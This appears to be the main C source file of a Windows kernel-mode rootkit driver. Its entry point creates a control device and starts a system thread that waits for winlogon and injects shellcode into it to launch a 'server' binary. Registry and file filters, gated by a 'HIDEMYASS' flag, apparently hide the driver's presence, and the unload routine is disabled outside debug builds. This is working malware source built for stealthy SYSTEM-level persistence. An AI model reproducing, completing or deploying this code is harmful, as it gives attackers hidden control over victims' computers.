#include "Driver.h"

UNICODE_STRING g_devicePathSymbolicLinkName = { 0 };
PFLT_FILTER g_pFltFileFilter = NULL;
PDEVICE_OBJECT g_pDeviceObject = NULL;
BOOLEAN g_FiltersEnabled = FALSE;


NTSTATUS DriverObjectCreateClose(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) 
{

	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS InitializeFiltering(PDRIVER_OBJECT pDriverObject, PFLT_FILTER* pFltFilter)
{

	NTSTATUS status = STATUS_SUCCESS;

	status = RfInitializeRegistryFilter(pDriverObject);

	if (!NT_SUCCESS(status))
	{
		return status;
	}

	status = FfRegisterFileFilter(pDriverObject, pFltFilter);


	return status;	
}

NTSTATUS UninitializeFiltering(PFLT_FILTER pFltFilter)
{

	NTSTATUS status = STATUS_SUCCESS;

	status = RfUninitializeRegistryFilter();


	if (status == STATUS_INVALID_PARAMETER)
	{
		status = STATUS_SUCCESS; // STATUS_INVALID_PARAMETER just means that there was no callback associated with the cookie
	}

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("RfUninitializeRegistryFilter", status);
		return status;
	}

	FfUnregisterFileFilter(pFltFilter);

	return status;
}

void WinlogonWaitThreadRoutine(PVOID startContext)
{
	ULONG firstWinlogonInstancePid = 0;
	LARGE_INTEGER delayInterval = { 0 };
	NTSTATUS status = STATUS_SUCCESS;

	DBGINFO("Winlogon wait thread started, waiting for first instance...");

	delayInterval.QuadPart =  (-10000000LL) * 3; // 3 Seconds

	while(!NT_SUCCESS(UGetFirstWinlogonInstancePid(&firstWinlogonInstancePid)))
	{
		KeDelayExecutionThread(KernelMode, FALSE, &delayInterval);
	}

	DBGINFO("Found first winlogon instance");

	status = UInjectShellcode(firstWinlogonInstancePid, winExecShellcode, sizeof(winExecShellcode), "\\\\.\\GLOBALROOT\\"SERVER_IMAGE_PATH, strlen("\\\\.\\GLOBALROOT\\"SERVER_IMAGE_PATH) + 1);
	
	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("UInjectShellcode", status);
	}

	DBGINFO("Successfully injected shellcode into winlogon process %lu", firstWinlogonInstancePid);
}

// Driver unload routine
void DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	NTSTATUS status = STATUS_SUCCESS;


#if HIDEMYASS

	if (g_FiltersEnabled)
	{
		NT_ASSERT(g_pFltFileFilter != NULL);

		status = UninitializeFiltering(g_pFltFileFilter);

		if (!NT_SUCCESS(status))
		{
			DBGWARN("UninitializeFiltering failed with NTSTATUS %08X", status);
		}
	}

#endif

	status = IoDeleteSymbolicLink(&g_devicePathSymbolicLinkName);

	if (!NT_SUCCESS(status))
	{
		DBGWARN("IoDeleteSymbolicLink failed with NTSTATUS %08X", status);
	}

	IoDeleteDevice(pDriverObject->DeviceObject);

	pDriverObject->DriverUnload = NULL;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{

	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING devicePath = { 0 };
	HANDLE winlogonWaitThread = NULL;
	CLIENT_ID winlogonWaitThreadCid = { 0 };


	RtlInitUnicodeString(&devicePath, L"\\Device\\"WIDE_DRIVER_NAME);
	RtlInitUnicodeString(&g_devicePathSymbolicLinkName, L"\\DosDevices\\"WIDE_DRIVER_NAME);

	UNICODE_STRING SecurityDescriptorString = SDDL_DEVOBJ_SYS_ALL_ADM_ALL;

	// Create a "secure" device (very) that only admin and system account can access (we just set a predefined Security descriptor)
	status = WdmlibIoCreateDeviceSecure(pDriverObject,
		0,
		&devicePath,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&SecurityDescriptorString,
		NULL,
		&g_pDeviceObject);

	if (!NT_SUCCESS(status))
	{
		return status;
	}

	status = IoCreateSymbolicLink(&g_devicePathSymbolicLinkName, &devicePath);

	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(g_pDeviceObject);
		return status;
	}

	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IhIOCTLHandler;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObjectCreateClose;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverObjectCreateClose;
	
#ifdef DEBUG

	pDriverObject->DriverUnload = DriverUnload;

#endif // DEBUG

	/* Create a thread that periodically enumerates all processes and checks if the first winlogon instance is running
		to inject the server-starting thread into it.
	*/
	status = IoCreateSystemThread(pDriverObject, &winlogonWaitThread, 0, NULL, NULL, &winlogonWaitThreadCid, WinlogonWaitThreadRoutine, NULL);

	if (!NT_SUCCESS(status))
	{
		DBGERRORNTSTATUS("IoCreateSystemThread", status);

		IoDeleteSymbolicLink(&g_devicePathSymbolicLinkName);

		IoDeleteDevice(g_pDeviceObject);
	}

	ZwClose(winlogonWaitThread);

	return status;
}